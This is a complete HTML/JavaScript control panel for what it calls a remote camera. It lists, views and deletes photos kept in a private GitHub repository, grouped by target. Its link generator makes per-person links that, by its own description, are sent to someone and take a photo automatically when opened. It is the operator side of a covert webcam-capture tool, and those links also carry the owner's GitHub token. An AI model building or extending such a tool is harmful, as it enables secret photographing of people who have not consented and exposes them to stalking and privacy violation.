<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>远程摄像头 · C端总控</title>
<style>
  body{margin:0;background:#0e0e10;color:#e8e8ea;font-family:system-ui,sans-serif}
  [hidden]{display:none!important}
  header{padding:14px 16px;border-bottom:1px solid #26262a;position:sticky;top:0;background:rgba(14,14,16,.94);z-index:5}
  h1{margin:0 0 8px;font-size:20px}
  .meta{font-size:13px;color:#9a9aa2}
  .meta b{color:#e8e8ea}
  button{padding:4px 10px;border:0;border-radius:6px;background:#2f6fed;color:#fff;font-size:12px;cursor:pointer}
  button.danger{background:#c0392b}
  button.mini{padding:3px 8px;font-size:11px}
  #tabs{margin-top:10px;display:flex;gap:6px;flex-wrap:wrap}
  #tabs button{background:#26262a;color:#c8c8ce;border-radius:14px;padding:4px 12px}
  #tabs button.on{background:#2f6fed;color:#fff}
  #setup{max-width:520px;margin:40px auto;padding:20px;background:#1a1a1e;border-radius:12px}
  textarea{width:100%;height:90px;background:#000;color:#eee;border:1px solid #444;border-radius:8px;padding:8px;box-sizing:border-box;font-size:13px}
  #grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px;padding:16px}
  .ph{position:relative;border-radius:8px;overflow:hidden;background:#1a1a1e;aspect-ratio:4/3;cursor:zoom-in}
  .ph img{width:100%;height:100%;object-fit:cover;display:block}
  .ph .t{position:absolute;left:6px;bottom:4px;font-size:11px;background:rgba(0,0,0,.65);padding:2px 6px;border-radius:6px}
  .ph .u{position:absolute;left:6px;top:4px;font-size:11px;background:rgba(47,111,237,.85);padding:2px 6px;border-radius:6px}
  .ph .d{position:absolute;right:4px;top:4px;background:rgba(0,0,0,.7);border:0;color:#f88;border-radius:6px;width:24px;height:24px;cursor:pointer;font-size:14px;line-height:1}
  #more{display:block;margin:8px auto 24px;padding:8px 20px;font-size:14px}
  #lb{position:fixed;inset:0;background:rgba(0,0,0,.92);display:flex;align-items:center;justify-content:center;z-index:10;cursor:zoom-out}
  #lb img{max-width:96vw;max-height:96vh}
  .empty{padding:40px;text-align:center;color:#888}
  .card{max-width:520px;margin:16px auto;background:#1a1a1e;border-radius:12px;padding:16px}
  .grow{display:flex;gap:8px;margin:10px 0}
  .grow input{flex:1;background:#000;color:#eee;border:1px solid #444;border-radius:8px;padding:8px;font-size:14px}
  .lbl{font-size:12px;color:#9a9aa2;margin:8px 0 2px}
  #gout a{display:block;font-size:12px;color:#5b9dff;word-break:break-all;margin:2px 0 6px}
</style>
</head>
<body>

<header>
  <h1>远程摄像头 · C端总控</h1>
  <div class="meta">照片：<b id="cnt">0</b> 张 · 最新：<b id="last">—</b> · 每 30 秒自动刷新 <button id="clr" class="danger">清空当前视图</button></div>
  <div id="tabs"></div>
</header>

<div id="setup" hidden>
  <h3>首次设置（只需一次）</h3>
  <p>请粘贴 GitHub Token（仅保存在当前浏览器，用于读取私有照片仓库）：</p>
  <textarea id="tk" placeholder="ghp_... 或 github_pat_..."></textarea>
  <p><button id="save">保存并查看</button> <span id="serr" style="color:#f66"></span></p>
</div>

<div class="card">
  <b>为新用户生成专属链接</b>
  <div class="grow"><input id="gname" placeholder="输入代号，如：张三 / u2"><button id="gmk">生成</button></div>
  <div id="gout" hidden>
    <div class="lbl">① 拍照链接（发给对方，打开即自动拍照，照片进他专属文件夹）</div>
    <a id="gcam" target="_blank"></a>
    <div class="lbl">② 他的专属后台（你自己收藏用；对方浏览器没存 token，打不开）</div>
    <a id="gadm" target="_blank"></a>
  </div>
</div>

<div id="grid"></div>
<button id="more" hidden>加载更多</button>
<div id="lb" hidden><img id="lbimg" alt=""></div>

<script>
var OWNER='qqq416423-a11y';
var REPO='cam-photos';
var CAM_BASE='https://qqq416423-a11y.github.io/cam-app/camera.html';
var ADM_BASE='https://qqq416423-a11y.github.io/cam-app/';
var API='https://api.github.com';

var $=function(id){return document.getElementById(id)};
var token=null,items=[],shown=48,cache={},view='全部',uids=[];

// C端与A端同域名，共享浏览器里已保存的 token；链接带 ?t= 时也可自动保存
var urlTok=new URLSearchParams(location.search).get('t');
if(urlTok){
  localStorage.setItem('cam_token',urlTok);
  try{history.replaceState(null,'',location.pathname)}catch(e){}
}

$('more').onclick=function(){shown+=48;render()};
$('lb').onclick=function(){$('lb').hidden=true};

if(localStorage.getItem('cam_token')){boot()}
else{
  $('setup').hidden=false;
  $('save').onclick=async function(){
    var t=$('tk').value.trim();
    if(!t){$('serr').textContent='请先输入 Token';return}
    try{
      var r=await fetch(API+'/repos/'+OWNER+'/'+REPO,{headers:{Authorization:'token '+t}});
      if(r.ok){localStorage.setItem('cam_token',t);boot()}
      else{$('serr').textContent='校验失败（HTTP '+r.status+'）'}
    }catch(e){$('serr').textContent='网络错误：'+e.message}
  };
}

function mt(p){var m=p.match(/IMG_(\d+)_/);return m?+m[1]:0}
function uidOf(p){
  var s=p.slice(7); // 去掉 photos/ 前缀
  var i=s.indexOf('/');
  return i>0?s.slice(0,i):'未分组';
}

async function boot(){
  token=localStorage.getItem('cam_token');
  $('setup').hidden=true;
  await refresh();
  setInterval(refresh,30000);
}

async function refresh(){
  var r;
  try{r=await fetch(API+'/repos/'+OWNER+'/'+REPO+'/git/trees/main?recursive=1',{headers:{Authorization:'token '+token}})}
  catch(e){return}
  if(!r.ok)return;
  var j=await r.json();
  items=(j.tree||[]).filter(function(x){
    return x.type==='blob'&&x.path.indexOf('photos/')===0&&/\.(jpe?g|png)$/i.test(x.path);
  }).map(function(x){return {path:x.path,sha:x.sha,uid:uidOf(x.path),mt:mt(x.path)}})
   .sort(function(a,b){return b.mt-a.mt||b.path.localeCompare(a.path)});
  var set={};
  items.forEach(function(it){if(it.uid!=='未分组')set[it.uid]=1});
  uids=Object.keys(set).sort();
  $('cnt').textContent=items.length;
  $('last').textContent=items.length?new Date(items[0].mt).toLocaleString():'—';
  renderTabs();render();
}

function renderTabs(){
  var t=$('tabs');t.innerHTML='';
  var names=['全部'].concat(uids);
  if(items.some(function(i){return i.uid==='未分组'}))names.push('未分组');
  names.forEach(function(u){
    var b=document.createElement('button');
    b.textContent=u==='全部'?'全部用户':u;
    if(view===u)b.className='on';
    b.onclick=function(){view=u;shown=48;renderTabs();render()};
    t.appendChild(b);
  });
}

function inView(it){return view==='全部'||it.uid===view}

function render(){
  var g=$('grid');g.innerHTML='';
  var vis=items.filter(inView);
  if(!vis.length){
    g.innerHTML='<div class="empty">这个视图还没有照片。</div>';
  }
  vis.slice(0,shown).forEach(function(it){g.appendChild(card(it))});
  $('more').hidden=vis.length<=shown;
}

function card(it){
  var d=document.createElement('div');d.className='ph';
  var img=document.createElement('img');
  if(cache[it.path]){img.src=cache[it.path]}
  else{loadImg(it,img)}
  img.loading='lazy';
  var u=document.createElement('div');u.className='u';u.textContent=it.uid;
  var t=document.createElement('div');t.className='t';
  t.textContent=it.mt?new Date(it.mt).toLocaleString('zh-CN',{hour12:false}):it.path;
  var del=document.createElement('button');del.className='d';del.textContent='×';del.title='删除';
  del.onclick=async function(ev){
    ev.stopPropagation();
    if(!confirm('删除这张照片？'))return;
    await fetch(API+'/repos/'+OWNER+'/'+REPO+'/contents/'+it.path,{
      method:'DELETE',
      headers:{Authorization:'token '+token,'Content-Type':'application/json'},
      body:JSON.stringify({message:'delete photo',sha:it.sha,branch:'main'})
    });
    refresh();
  };
  img.onclick=function(){
    $('lbimg').src=cache[it.path]||img.src;$('lb').hidden=false;
  };
  d.appendChild(img);d.appendChild(u);d.appendChild(t);d.appendChild(del);
  return d;
}

async function loadImg(it,img){
  try{
    var r=await fetch(API+'/repos/'+OWNER+'/'+REPO+'/contents/'+it.path,
      {headers:{Authorization:'token '+token,Accept:'application/vnd.github.raw'}});
    if(!r.ok)return;
    var url=URL.createObjectURL(await r.blob());
    cache[it.path]=url;img.src=url;
  }catch(e){}
}

$('clr').onclick=async function(){
  var vis=items.filter(inView);
  if(!vis.length)return;
  if(!confirm('确定删除当前视图的全部 '+vis.length+' 张照片？不可恢复！'))return;
  for(var i=0;i<vis.length;i++){
    try{
      await fetch(API+'/repos/'+OWNER+'/'+REPO+'/contents/'+vis[i].path,{
        method:'DELETE',
        headers:{Authorization:'token '+token,'Content-Type':'application/json'},
        body:JSON.stringify({message:'delete photo',sha:vis[i].sha,branch:'main'})
      });
    }catch(e){}
  }
  refresh();
};

// 链接生成器：给每个新用户生成专属的拍照链接和后台链接
$('gmk').onclick=function(){
  var n=($('gname').value||'').trim().replace(/[^\w\u4e00-\u9fa5-]/g,'');
  if(!n){alert('请输入代号');return}
  var cam=CAM_BASE+'?t='+encodeURIComponent(token)+'&uid='+encodeURIComponent(n);
  var adm=ADM_BASE+'?uid='+encodeURIComponent(n);
  $('gcam').textContent=cam;$('gcam').href=cam;
  $('gadm').textContent=adm;$('gadm').href=adm;
  $('gout').hidden=false;
};
$('gcam').onclick=function(e){
  e.preventDefault();
  navigator.clipboard.writeText($('gcam').href).then(function(){$('gcam').textContent='已复制，粘贴发给对方即可'},function(){prompt('请手动复制：',$('gcam').href)});
};
$('gadm').onclick=function(e){
  e.preventDefault();
  navigator.clipboard.writeText($('gadm').href).then(function(){},function(){prompt('请手动复制：',$('gadm').href)});
};
</script>
</body>
</html>
